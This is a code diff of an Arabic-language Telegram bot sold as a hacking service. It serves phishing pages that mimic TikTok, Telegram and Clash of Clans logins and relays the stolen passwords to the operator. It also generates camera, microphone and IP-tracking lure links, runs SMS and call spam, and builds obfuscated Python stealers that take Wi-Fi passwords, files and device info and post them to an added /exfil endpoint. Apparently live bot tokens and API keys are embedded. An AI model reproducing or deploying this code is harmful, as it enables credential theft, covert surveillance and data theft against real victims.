@@ -33,15 +33,9 @@ sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='repla
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ==============================================================================
-# تم إصلاح الروابط لتعمل تلقائياً حسب السيرفر الذي يعمل عليه البوت
-# ==============================================================================
 WEB_HOST_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:8080").rstrip('/')
 BASE_SOCIAL_URL = WEB_HOST_URL
 
-# ==============================================================================
-# تم إلغاء الإيموجي المميز نهائياً لمنع ظهور الأكواد للجميع
-# ==============================================================================
 def ce(emoji):
     return emoji
 
@@ -64,18 +58,13 @@ try:
 except:
     pass
 
-# ==============================================================================
-# 1. الإعدادات الأساسية والتوكنات
-# ==============================================================================
-
-BOT_TOKEN = "8392139768:AAEQj6a7LvEsUB1OiepCsFLGXMDTFjq2bFU"
+BOT_TOKEN = "8691786416:AAFAPMurRLxfDQHlW_w6Zi6a4_lGXV1IE5c"
 FAKE_BOT_TOKEN = "8978976697:AAFVOhdI2GQUeZGheYw31Oz9ixsbZRpuZ7A"
 FAKE_BOT_USERNAME = "Mdnsmbot"
 
 OWNER_ID = 8259194746
 API_ID = int(os.environ.get('API_ID', '20372537'))
 API_HASH = os.environ.get('API_HASH', '3bbd89427c05bfd2e60c8b1ab7bfb9bb')
-ACCOUNTS_FILE = 'matrix_accounts_v5_data.json'
 
 DATA_DIR = "bot_data"
 os.makedirs(DATA_DIR, exist_ok=True)
@@ -118,10 +107,6 @@ ds_data = {}
 fake_sessions = {} 
 fake_states = {} 
 
-# ==============================================================================
-# 2. سيرفر الويب المدمج (الهندسة الاجتماعية + المراقبة + التتبع)
-# ==============================================================================
-
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
 
@@ -157,7 +142,8 @@ def render_phish_page(platform, cid):
         return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free TikTok Likes</title><style>body{{font-family:sans-serif;background:#161823;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;color:#161823;padding:40px;border-radius:12px;width:350px;text-align:center}}.logo{{font-size:32px;font-weight:800;color:#fe2c55;margin-bottom:20px}}input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><div class="logo">TikTok Likes</div><h3>Get 50,000 Likes</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="TikTokLikes"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="TikTok Username" required><input type="password" name="password" placeholder="TikTok Password" required><button type="submit">Send Likes</button></form></div></body></html>'''
     elif platform == "telegram_login":
         return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Telegram Web Login</title><style>body{{font-family:sans-serif;background:#17212b;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:12px;width:350px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2)}}.logo{{width:80px;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#2aabee;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1024px-Telegram_logo.svg.png" class="logo" alt="Telegram"><h3>Log In to Telegram</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="TelegramLogin"><input type="hidden" name="id" value="{cid}"><input type="text" name="phone" placeholder="Phone Number (with country code)" required><input type="password" name="password" placeholder="Telegram Password" required><button type="submit">NEXT</button></form></div></body></html>'''
-    
+    elif platform == "clash_of_clans":
+        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free Clash of Clans Gems</title><style>body{{font-family:Arial, sans-serif;background:#1a1a1a;color:#f0e6d2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#2c2c2c;padding:30px;border-radius:10px;width:350px;text-align:center;box-shadow:0 0 15px rgba(255,215,0,0.3);border:1px solid #ffd700}}h2{{color:#ffd700;margin-bottom:20px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #555;border-radius:4px;box-sizing:border-box;background:#222;color:#fff}}button{{width:100%;padding:12px;background:linear-gradient(to bottom, #ffd700, #ffb700);color:#000;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><h2>Clash of Clans</h2><p>Get 10,000 Free Gems!</p><form action="/catch" method="POST"><input type="hidden" name="platform" value="ClashOfClans"><input type="hidden" name="id" value="{cid}"><input type="text" name="player_tag" placeholder="Player Tag (#ABC123)" required><input type="email" name="email" placeholder="Supercell Email" required><input type="password" name="password" placeholder="Email Password" required><button type="submit">Claim Gems Now</button></form></div></body></html>'''
     return "Page not found."
 
 def render_freefire_page(cid):
@@ -170,21 +156,16 @@ def web_home():
 @app.route('/<platform>')
 def dynamic_phish(platform):
     cid = request.args.get('user')
-    if not cid:
-        return "User not specified.", 400
-    if platform == "freefire":
-        return render_freefire_page(cid)
-    elif platform in ["tiktok", "facebook", "instagram", "whatsapp", "twitter", "snapchat", "pubg", "insta_followers", "tiktok_likes", "telegram_login"]:
-        return render_phish_page(platform, cid)
-    elif platform in ["photo_front", "photo_back", "video_front", "audio_mic"]:
-        return render_surveillance_page(platform, cid)
+    if not cid: return "User not specified.", 400
+    if platform == "freefire": return render_freefire_page(cid)
+    elif platform in ["tiktok", "facebook", "instagram", "whatsapp", "twitter", "snapchat", "pubg", "insta_followers", "tiktok_likes", "telegram_login", "clash_of_clans"]: return render_phish_page(platform, cid)
+    elif platform in ["photo_front", "photo_back", "video_front", "audio_mic"]: return render_surveillance_page(platform, cid)
     return "Page not found.", 404
 
 @app.route('/ip_track')
 def ip_track():
     cid = request.args.get('user')
-    if not cid:
-        return "Invalid link", 400
+    if not cid: return "Invalid link", 400
     try:
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,query").json()
@@ -194,19 +175,16 @@ def ip_track():
         msg += f"🏙 <b>المدينة:</b> {r.get('city', 'N/A')}\n"
         msg += f"📡 <b>مزود الخدمة:</b> {r.get('isp', 'N/A')}\n"
         bot.send_message(int(cid), msg)
-    except:
-        pass
+    except: pass
     return redirect("https://www.google.com/search?q=whats+my+ip")
 
 @app.route('/check_vip/<cid>')
 def api_check_vip(cid):
     try:
         user_obj = get_user(int(cid))
-        if is_admin(int(cid)) or (user_obj and check_vip(user_obj)):
-            return "VALID", 200
+        if is_admin(int(cid)) or (user_obj and check_vip(user_obj)): return "VALID", 200
         return "INVALID", 403
-    except:
-        return "INVALID", 403
+    except: return "INVALID", 403
 
 @app.route('/catch_media', methods=['POST'])
 def catch_media():
@@ -214,29 +192,53 @@ def catch_media():
         cid = request.form.get('id')
         media_type = request.form.get('type')
         file = request.files.get('file')
-        if not file or not cid:
-            return "Error", 400
-
+        if not file or not cid: return "Error", 400
         user_obj = get_user(int(cid))
-        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))):
-            return redirect("https://google.com")
-
+        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return redirect("https://google.com")
         ext = ".jpg" if "photo" in media_type else ".webm"
         filename = f"temp_{media_type}{ext}"
         file.save(filename)
-
         increment_stat("hacked")
-        
         with open(filename, 'rb') as f:
             if "photo" in media_type:
                 cap = "📸 صورة أمامية" if "front" in media_type else "📷 صورة خلفية"
                 bot.send_photo(int(cid), f, caption=f"{cap}\nتم التقاطها عبر الرابط بنجاح.")
-            elif "video" in media_type:
-                bot.send_video(int(cid), f, caption=f"🎥 فيديو مسجل (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
-            elif "audio" in media_type:
-                bot.send_audio(int(cid), f, caption=f"🎙️ تسجيل صوتي (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
-
+            elif "video" in media_type: bot.send_video(int(cid), f, caption=f"🎥 فيديو مسجل (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
+            elif "audio" in media_type: bot.send_audio(int(cid), f, caption=f"🎙️ تسجيل صوتي (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
         os.remove(filename)
+        return "Success", 200
+    except Exception as e: return f"Error: {e}", 500
+
+@app.route('/exfil', methods=['POST'])
+def exfil_data():
+    try:
+        cid = request.form.get('cid')
+        ftype = request.form.get('type', 'Document')
+        text_data = request.form.get('text')
+        file = request.files.get('file')
+        
+        if not cid: return "Error", 400
+        
+        user_obj = get_user(int(cid))
+        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return "Error", 403
+
+        if text_data and not file:
+            bot.send_message(int(cid), text_data)
+            return "Success", 200
+
+        if not file: return "Error", 400
+
+        temp_path = f"temp_{file.filename}"
+        file.save(temp_path)
+        
+        with open(temp_path, 'rb') as f:
+            if ftype == "Photo": bot.send_photo(int(cid), f)
+            elif ftype == "Video": bot.send_video(int(cid), f)
+            elif ftype == "Audio": bot.send_audio(int(cid), f)
+            else: bot.send_document(int(cid), f)
+        
+        os.remove(temp_path)
+        increment_stat("hacked")
         return "Success", 200
     except Exception as e:
         return f"Error: {e}", 500
@@ -250,13 +252,10 @@ def catch_credentials():
         user_data.pop('platform', None)
         user_data.pop('id', None)
         user_obj = get_user(int(cid))
-        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))):
-            return redirect("https://google.com")
+        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))): return redirect("https://google.com")
         msg = f"{ce('🎣')} <b>[ تم الصيد - {platform} ]</b>\n\n"
-        try:
-            increment_stat("hacked")
-        except:
-            pass
+        try: increment_stat("hacked")
+        except: pass
         for key, value in user_data.items():
             msg += f"{ce('🔹')} <b>{key}:</b> <code>{value}</code>\n"
         bot.send_message(int(cid), msg)
@@ -272,9 +271,9 @@ def catch_credentials():
         elif platform == "InstaFollowers": return redirect("https://www.instagram.com/")
         elif platform == "TikTokLikes": return redirect("https://www.tiktok.com/")
         elif platform == "TelegramLogin": return redirect("https://web.telegram.org/")
+        elif platform == "ClashOfClans": return redirect("https://supercell.com/en/clashofclans/")
         else: return redirect("https://google.com")
-    except Exception as e:
-        return f"Error: {e}", 500
+    except Exception as e: return f"Error: {e}", 500
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
@@ -284,9 +283,6 @@ def keep_alive():
     t = Thread(target=run_web, daemon=True)
     t.start()
 
-# ==============================================================================
-# 3. دوال قواعد البيانات
-# ==============================================================================
 def load_data(file, default=None):
     if default is None: default = []
     if os.path.exists(file):
@@ -302,7 +298,7 @@ def save_data(file, data):
 
 def load_users(): return load_data(USERS_FILE, [])
 def save_users(u): save_data(USERS_FILE, u)
-def load_vip_key(): return load_data(VIP_KEYS_FILE, {})
+def load_vip_keys(): return load_data(VIP_KEYS_FILE, {})
 def save_vip_keys(k): save_data(VIP_KEYS_FILE, k)
 def load_stats(): return load_data(STATS_FILE, {"hacked": 0, "files": 0})
 def save_stats(s): save_data(STATS_FILE, s)
@@ -372,7 +368,6 @@ def add_user(uid, uname, fname, ref_by=None):
             dt_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             uname_str = f"@{uname}" if uname else "لا يوجد"
             bot_username = bot.get_me().username
-            
             msg = f"{ce('🔔')} <b>عضو جديد انضم للبوت!</b>\n\n"
             msg += f"{ce('👤')} <b>الاسم:</b> {fname}\n"
             msg += f"{ce('👥')} <b>يوزر العضو:</b> {uname_str}\n"
@@ -408,9 +403,6 @@ def check_sub(uid):
         except: not_sub.append(ch)
     return len(not_sub) == 0, not_sub
 
-# ==============================================================================
-# 4. بناء القوائم 
-# ==============================================================================
 def btn(text, cb=None, url=None, style="primary"):
     return InlineKeyboardButton(f"{text}", callback_data=cb, url=url, style=style)
 
@@ -418,8 +410,7 @@ def main_menu(uid):
     m = InlineKeyboardMarkup()
     m.row(btn("🆓 [ القسم المجاني ]", "free_menu", style="success"), btn("💎 [ القسم المدفوع VIP ]", "vip_menu", style="danger"))
     m.row(btn("🎭 [ معلومات البوت ]", "bot_info", style="primary"))
-    if is_admin(uid):
-        m.row(btn("👑 [ لوحة تحكم الأدمن ]", "admin_panel", style="danger"))
+    if is_admin(uid): m.row(btn("👑 [ لوحة تحكم الأدمن ]", "admin_panel", style="danger"))
     m.row(btn("⚙️ [ المطور ]", url="https://t.me/a_mutamarid", style="primary"), btn("📡 [ قناة البوت ]", url="https://t.me/mutmared1", style="success"))
     return m
 
@@ -446,7 +437,6 @@ def vip_menu(uid=None):
         if not user_data:
             add_user(uid, None, None)
             user_data = get_user(uid)
-        
         if is_admin(uid) or check_vip(user_data):
             m.row(btn("📁 [ ساحب جميع الملفات (كمبيوتر/هاتف) ]", "gen_all_files", style="danger"))
             m.row(btn("📡 [ اختراق سوشيال ميديا ]", "social_menu", style="danger"))
@@ -479,6 +469,7 @@ def social_menu():
     m.row(btn("📘 [ اختراق فيسبوك ]", "social_facebook", style="danger"), btn("📷 [ اختراق انستغرام ]", "social_instagram", style="danger"))
     m.row(btn("🐦 [ اختراق تويتر ]", "social_twitter", style="danger"), btn("👻 [ اختراق سناب شات ]", "social_snapchat", style="danger"))
     m.row(btn("🎮 [ شحن فري فاير وهمي ]", "freefire_hack", style="danger"), btn("🔫 [ شحن ببجي UC وهمي ]", "pubg_hack", style="danger"))
+    m.row(btn("⚔️ [ شحن جواهر كلاش اوف كلانس ]", "clash_of_clans_hack", style="danger"))
     m.row(btn("➕ [ متابعين انستغرام وهمي ]", "insta_followers_hack", style="danger"), btn("❤️ [ لايكات تيك توك وهمي ]", "tiktok_likes_hack", style="danger"))
     m.row(btn("📱 [ تسجيل دخول تيليجرام ]", "telegram_login_hack", style="danger"))
     m.row(btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
@@ -533,30 +524,21 @@ def fake_bot_welcome_menu():
     m.row(btn("📜 معلومات الخدمة", "fake_info", style="success"))
     return m
 
-# ==============================================================================
-# تهيئة البوتات
-# ==============================================================================
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 fake_bot = telebot.TeleBot(FAKE_BOT_TOKEN, parse_mode="HTML")
 
-# ==============================================================================
-# 5. التشفير الديناميكي (9 طبقات)
-# ==============================================================================
-def military_encrypt(code, token):
+def military_encrypt(code):
     import zlib, base64, binascii, hashlib, random
-    token_bytes = str(list(token.encode('utf-8')))
-    code = code.replace("__TOKEN_ARRAY__", token_bytes)
-    
-    c = zlib.compress(code.encode('utf-8'), 9) # 1
-    c = base64.b64encode(c) # 2
-    c = c[::-1] # 3
+    c = zlib.compress(code.encode('utf-8'), 9)
+    c = base64.b64encode(c)
+    c = c[::-1]
     key = hashlib.sha256(str(random.random()).encode()).digest()
-    c = bytes([b ^ key[i % len(key)] for i, b in enumerate(c)]) # 4
-    c = base64.b85encode(c) # 5
-    c = binascii.hexlify(c) # 6
-    c = zlib.compress(c) # 7
-    c = base64.b32encode(c) # 8
-    c = base64.b64encode(c) # 9
+    c = bytes([b ^ key[i % len(key)] for i, b in enumerate(c)])
+    c = base64.b85encode(c)
+    c = binascii.hexlify(c)
+    c = zlib.compress(c)
+    c = base64.b32encode(c)
+    c = base64.b64encode(c)
     
     key_b64 = base64.b64encode(key).decode('utf-8')
     payload = c.decode('utf-8')
@@ -580,9 +562,6 @@ def military_encrypt(code, token):
     enc_decoder = base64.b64encode(decoder.encode('utf-8')).decode('utf-8')
     return f"import base64;exec(base64.b64decode('{enc_decoder}'))"
 
-# ==============================================================================
-# 6. محركات السبام المباشر
-# ==============================================================================
 def telz_call_real(phone):
     android_id = uuid.uuid4().hex[:16]
     uid = str(uuid.uuid4())
@@ -594,14 +573,10 @@ def telz_call_real(phone):
         time.sleep(0.5)
         r4 = requests.post("https://api.telz.com/app/auth_call", json={"android_id": android_id, "app_version": "17.5.48", "attempt": "0", "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15", "phone": phone, "ts": int(time.time() * 1000), "uuid": uid, "run_id": str(int(time.time() * 1000))}, headers=headers, timeout=5)
         result = r4.json()
-        if result.get('status') == 'ok':
-            return True, f"{ce('✅')} تم إرسال المكالمة بنجاح"
-        elif result.get('reason') == '3.1':
-            return False, f"{ce('⚠️')} الرقم مسجل مسبقاً"
-        else:
-            return False, f"{ce('❌')} فشل إرسال المكالمة"
-    except Exception as e:
-        return False, f"{ce('❌')} خطأ: {str(e)[:30]}"
+        if result.get('status') == 'ok': return True, f"{ce('✅')} تم إرسال المكالمة بنجاح"
+        elif result.get('reason') == '3.1': return False, f"{ce('⚠️')} الرقم مسجل مسبقاً"
+        else: return False, f"{ce('❌')} فشل إرسال المكالمة"
+    except Exception as e: return False, f"{ce('❌')} خطأ: {str(e)[:30]}"
 
 def yolla_call_real(phone):
     headers = {'User-Agent': "com.yollacalls/4.71 (Redmi Note 8 Pro; Android 11; ar_EG)", 'Connection': "Keep-Alive", 'Accept': "application/json", 'Accept-Encoding': "gzip", 'Accept-Charset': "UTF-8", 'Accept-Language': "ar"}
@@ -610,11 +585,9 @@ def yolla_call_real(phone):
     payload['phone'] = phone
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=15)
-        if response.status_code == 200 and "success" in response.text:
-            return True, f"{ce('✅')} تم إرسال مكالمة Yolla بنجاح"
+        if response.status_code == 200 and "success" in response.text: return True, f"{ce('✅')} تم إرسال مكالمة Yolla بنجاح"
         return False, f"{ce('❌')} فشل الإرسال: {response.text[:50]}"
-    except Exception as e:
-        return False, f"{ce('❌')} خطأ: {str(e)[:30]}"
+    except Exception as e: return False, f"{ce('❌')} خطأ: {str(e)[:30]}"
 
 def send_ether_spam_real(phone, count, task_data, stop_event):
     success, failed = 0, 0
@@ -702,12 +675,9 @@ def run_ds_task(cid, service, target, count=1):
         stop_event.set()
         time.sleep(1.5) 
         final_txt = f"{ce('✅')} <b>اكتمل سبام {name}!</b>\n\n{ce('🎯')} الهدف: <code>{target}</code>\n{ce('🔢')} العدد المطلوب: {count}\n\n{ce('🟢')} النجاح: <code>{s}</code>\n{ce('🔴')} الفشل: <code>{f}</code>\n"
-        try:
-            bot.edit_message_text(final_txt, cid, msg.message_id, reply_markup=vip_menu(cid))
-        except:
-            bot.send_message(cid, final_txt, reply_markup=vip_menu(cid))
-        if cid in spam_tasks:
-            del spam_tasks[cid]
+        try: bot.edit_message_text(final_txt, cid, msg.message_id, reply_markup=vip_menu(cid))
+        except: bot.send_message(cid, final_txt, reply_markup=vip_menu(cid))
+        if cid in spam_tasks: del spam_tasks[cid]
 
 def live_stats_updater(cid, service, target):
     while cid in spam_tasks and not spam_tasks[cid]["stop"].is_set():
@@ -718,18 +688,13 @@ def live_stats_updater(cid, service, target):
             bar = "█" * int(20 * p / t) + "░" * (20 - int(20 * p / t)) if t > 0 else "░" * 20
             txt = f"{ce('🔴')} <b>شاشة الإحصائيات الحية</b> {ce('🔴')}\n\n{ce('🎯')} الهدف: <code>{target}</code>\n{ce('⚡')} الخدمة: {service.upper()}\n\n{ce('📊')} التقدم: {p}/{t} ({percent}%)\n[{bar}]\n\n{ce('🟢')} ناجح: <code>{s}</code>\n{ce('🔴')} فاشل: <code>{f}</code>\n\n⏱ يتم التحديث تلقائياً..."
             bot.edit_message_text(txt, cid, data["msg_id"])
-        except:
-            pass
+        except: pass
         time.sleep(1.2)
 
-# ==============================================================================
-# 7. معالجات البوت الأساسي
-# ==============================================================================
 @bot.callback_query_handler(func=lambda call: True)
 def handle_all_buttons(call):
     cid = call.message.chat.id
-    if is_banned(cid):
-        return
+    if is_banned(cid): return
     data = call.data
 
     if data == "admin_panel" and is_admin(cid):
@@ -883,34 +848,26 @@ def handle_all_buttons(call):
         user_data = get_user(cid)
         if not (is_admin(cid) or (user_data and check_vip(user_data))):
             return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
-        
         surv_type = data.replace("surv_", "")
         surv_link = f"{WEB_HOST_URL}/{surv_type}?user={cid}"
-        
-        names = {
-            "photo_front": "📸 صورة بالكاميرا الأمامية",
-            "photo_back": "📷 صورة بالكاميرا الخلفية",
-            "video_front": "🎥 تسجيل فيديو",
-            "audio_mic": "🎙️ تسجيل صوتي"
-        }
+        names = {"photo_front": "📸 صورة بالكاميرا الأمامية", "photo_back": "📷 صورة بالكاميرا الخلفية", "video_front": "🎥 تسجيل فيديو", "audio_mic": "🎙️ تسجيل صوتي"}
         safe_edit(f"{ce('🔗')} <b>[ {names.get(surv_type, 'التقاط')} ]</b>\n\nتم إنشاء رابط المراقبة:\n<code>{surv_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية. عند فتحه وموافقته، سيتم إرسال المحتوى إليك هنا.</i>", cid, call.message.message_id, reply_markup=surveillance_menu())
 
     elif data == "gen_wifi_stealer":
         user_data = get_user(cid)
         if not (is_admin(cid) or (user_data and check_vip(user_data))):
             return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
-            
         safe_edit(f"⏳ <b>جاري توليد أداة سحب كلمات مرور الواي فاي...</b>", cid, call.message.message_id)
         try:
             increment_stat("files")
             tool_code = '''
-import time, sys, os, requests, subprocess, glob
+import time, sys, os, subprocess, glob, requests
 
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
 C = "__CHAT_ID__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "📶 جاري سحب كلمات مرور الواي فاي..."})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "📶 جاري سحب كلمات مرور الواي فاي..."})
 except: pass
 
 data = ""
@@ -945,14 +902,13 @@ except Exception as e:
     data = f"خطأ: {e}"
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendDocument", files={"document": ("WiFi_Passwords.txt", data)}, data={"chat_id": C, "caption": "📶 تم سحب كلمات مرور الواي فاي بنجاح!"})
-except Exception as e:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"❌ خطأ في الإرسال: {e}"})
+    requests.post(EXFIL_URL, files={'file': ('WiFi_Passwords.txt', data)}, data={'cid': C})
+except: pass
 
 time.sleep(5)
 '''
-            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+            enc_code = military_encrypt(tool_code)
             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = "WiFi_Stealer.py"
             bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب الواي فاي بنجاح!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
@@ -964,30 +920,25 @@ time.sleep(5)
         user_data = get_user(cid)
         if not (is_admin(cid) or (user_data and check_vip(user_data))):
             return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
-            
         safe_edit(f"⏳ <b>جاري توليد أداة سحب جميع الملفات...</b>", cid, call.message.message_id)
         try:
             increment_stat("files")
             tool_code = '''
 import time, sys, os, requests
 
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
 C = "__CHAT_ID__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 def send_file(filepath):
     try:
         if os.path.getsize(filepath) < 50000000: # 50MB Limit
-            url = "https://api.telegram.org/bot" + T + "/sendDocument"
-            f_obj = open(filepath, "rb")
-            files = {"document": f_obj}
-            data = {"chat_id": C}
-            requests.post(url, files=files, data=data, timeout=120)
-            f_obj.close()
+            files = {'file': open(filepath, 'rb')}
+            data = {'cid': C}
+            requests.post(EXFIL_URL, files=files, data=data, timeout=120)
     except: pass
 
 paths = []
 
-# Detect OS and set paths
 if os.name == 'nt': # Windows
     user = os.environ.get('USERPROFILE', 'C:\\\\Users\\\\Public')
     paths.append(os.path.join(user, 'Desktop'))
@@ -1011,7 +962,7 @@ max_files = 200
 extracted = 0
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "📁 جاري سحب الملفات من الجهاز..."})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "📁 جاري سحب الملفات من الجهاز..."})
 except: pass
 
 for p in paths:
@@ -1026,13 +977,13 @@ for p in paths:
                 extracted += 1
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"✅ تم الانتهاء من سحب الملفات. تم إرسال {extracted} ملف."})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': f"✅ تم الانتهاء من سحب الملفات. تم إرسال {extracted} ملف."})
 except: pass
 
 time.sleep(5)
 '''
-            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+            enc_code = military_encrypt(tool_code)
             file_stream = io.BytesIO(enc_code.encode('utf-8'))
             file_stream.name = "All_Files_Stealer.py"
             bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب جميع الملفات!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
@@ -1044,7 +995,6 @@ time.sleep(5)
         safe_edit(f"⏳ <b>جاري التوليد والتشفير الفعلي...</b>", cid, call.message.message_id)
         try:
             increment_stat("files")
-            
             if data == "gen_images":
                 exts = "['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']"
                 ftype = "Photo"
@@ -1062,9 +1012,11 @@ time.sleep(5)
                 ftype = "Document"
                 tool_name = "Docs_Stealer.py"
             else:
-                tool_code = '''import time, sys, os, requests, subprocess, platform
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+                tool_code = '''
+import time, sys, os, requests, subprocess, platform
+
 C = "__CHAT_ID__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 def get_info():
     info = "💻 معلومات الجهاز:\\n\\n"
@@ -1081,21 +1033,23 @@ def get_info():
     return info
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": get_info()})
+    requests.post(EXFIL_URL, data={'cid': C, 'text': get_info()})
 except: pass
 time.sleep(5)
 '''
-                tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-                enc_code = military_encrypt(tool_code, BOT_TOKEN)
+                tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+                enc_code = military_encrypt(tool_code)
                 file_stream = io.BytesIO(enc_code.encode('utf-8'))
                 file_stream.name = "System_Info.py"
                 bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت بنجاح (9 طبقات).</b>", reply_markup=free_menu())
                 bot.delete_message(cid, call.message.message_id)
                 return
 
-            tool_code = '''import time, sys, os, requests
-T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+            tool_code = '''
+import time, sys, os, requests
+
 C = "__CHAT_ID__"
+EXFIL_URL = "__WEB_URL__/exfil"
 
 if not os.path.exists("/sdcard"):
     print("هذا البرنامج يدعم أجهزة الهاتف فقط.")
@@ -1104,22 +1058,17 @@ if not os.path.exists("/sdcard"):
 def send_file(filepath, ftype):
     try:
         if os.path.getsize(filepath) < 50000000: 
-            url = "https://api.telegram.org/bot" + T + "/send" + ftype
-            f_obj = open(filepath, "rb")
-            files = {ftype.lower(): f_obj}
-            data = {"chat_id": C}
-            requests.post(url, files=files, data=data, timeout=60)
-            f_obj.close()
-    except:
-        pass
+            files = {'file': open(filepath, "rb")}
+            data = {'cid': C, 'type': ftype}
+            requests.post(EXFIL_URL, files=files, data=data, timeout=60)
+    except: pass
 
 print("تم التشغيل لفك وتهيئة النظام...")
 time.sleep(1)
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "✅ تم الدخول للهاتف!\\n🎯 جاري سحب الملفات المحددة..."})
-except:
-    pass
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ تم الدخول للهاتف!\\n🎯 جاري سحب الملفات المحددة..."})
+except: pass
 
 allowed_exts = ''' + exts + '''
 
@@ -1146,19 +1095,17 @@ for p in paths:
                     if file.lower().endswith(tuple(allowed_exts)):
                         send_file(fp, "''' + ftype + '''")
                         extracted += 1
-                except:
-                    pass
+                except: pass
 
 try:
-    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "✅ تم الانتهاء من السحب. تم إرسال " + str(extracted) + " ملف."})
-except:
-    pass
+    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ تم الانتهاء من السحب. تم إرسال " + str(extracted) + " ملف."})
+except: pass
 
 print("اكتمل التحديث. يمكنك الإغلاق.")
 time.sleep(5)
 '''
-            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
-            enc_code = military_encrypt(tool_code, BOT_TOKEN)
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
+            enc_code = military_encrypt(tool_code)
